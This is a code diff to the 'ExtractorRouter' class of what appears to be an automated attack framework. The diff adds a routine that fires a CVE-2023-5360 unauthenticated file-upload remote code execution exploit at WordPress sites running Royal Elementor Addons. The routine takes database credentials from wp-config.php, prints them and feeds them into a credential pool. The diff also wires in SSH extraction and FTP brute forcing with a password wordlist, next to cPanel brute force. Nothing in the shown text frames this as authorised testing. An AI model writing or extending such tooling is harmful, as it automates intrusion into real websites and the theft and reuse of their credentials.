@@ -35,10 +35,10 @@ class ExtractorRouter:
                 self._run_wpscan(domain_id, ip, www_host, port)
                 self._run_nikto(domain_id, ip, www_host, port)
 
-            # 2.5 Exploit Royal Elementor if detected by WPScan
-            wpscan = self.results[domain_id].get('wpscan', {})
-            if 'royal-elementor-addons' in wpscan.get('plugins', {}):
-                self._run_royal_elementor_exploit(domain_id, ip, www_host, port)
+                # 2.5 Exploit Royal Elementor if detected by WPScan
+                wpscan = self.results[domain_id].get('wpscan', {})
+                if 'royal-elementor-addons' in wpscan.get('plugins', {}):
+                    self._run_royal_elementor_exploit(domain_id, ip, www_host, port)
 
             # 3. cPanel brute force
             if self._has_port(data, 2083):
@@ -91,6 +91,33 @@ class ExtractorRouter:
                 print(f"\n[ROUTER] Re-scanning origin IP {origin_ip} for {host}")
                 self.scanner._scan_target(f"{domain_id}_origin", host, origin_ip)
                 self.scanner._export_json()
+
+    def _run_royal_elementor_exploit(self, domain_id: str, ip: str, host: str, port: int):
+            """Attempt CVE-2023-5360 unauthenticated file upload RCE against Royal Elementor Addons.
+
+            If successful, extracts wp-config.php DB credentials and injects them
+            into the credential pool for MySQL direct connection.
+
+            Args:
+                domain_id (str): Target identifier.
+                ip (str): Target IP.
+                host (str): Domain name.
+                port (int): HTTP/HTTPS port.
+            """
+            from src.utils.extractors.royal_elementor_exploit import RoyalElementorExploit
+            exploit = RoyalElementorExploit(host=host, ip=ip, port=port)
+            result = exploit.run()
+
+            self.results[domain_id]['royal_elementor_exploit'] = result
+
+            if result['status'] == 'success' and result.get('db_credentials'):
+                creds = result['db_credentials']
+                user = creds.get('db_user')
+                password = creds.get('db_password')
+                if user and password:
+                    self.found_credentials.setdefault(domain_id, [])
+                    self.found_credentials[domain_id].insert(0, (user, password))
+                    print(f"  [ROUTER] DB credentials from wp-config injected: {user}:{password}")
 
     def _run_wpscan(self, domain_id: str, ip: str, host: str, port: int):
         """Run WPScan recon and inject discovered usernames into credential pool.
@@ -188,12 +215,21 @@ class ExtractorRouter:
             'MySQL':      MySQLExtractor,
             'PostgreSQL': PostgresExtractor,
             'FTP':        FTPExtractor,
+            'SSH':        SSHExtractor,
         }
 
         extractor_class = extractors.get(service)
         if extractor_class:
             print(f"  [MATCH] Port {port} ({service}) — launching extractor")
-            extractor = extractor_class(ip, port)
+            if service == 'FTP':
+                extractor = FTPExtractor(
+                    ip=ip,
+                    port=port,
+                    credentials=self.found_credentials.get(domain_id, []),
+                    wordlist_path='wordlists/passwords.txt' if getattr(self, 'run_exploit', False) else None,
+                )
+            else:
+                extractor = extractor_class(ip, port)
             extractor.run()
         else:
             print(f"  [SKIP] Port {port} ({service}) — no extractor available")
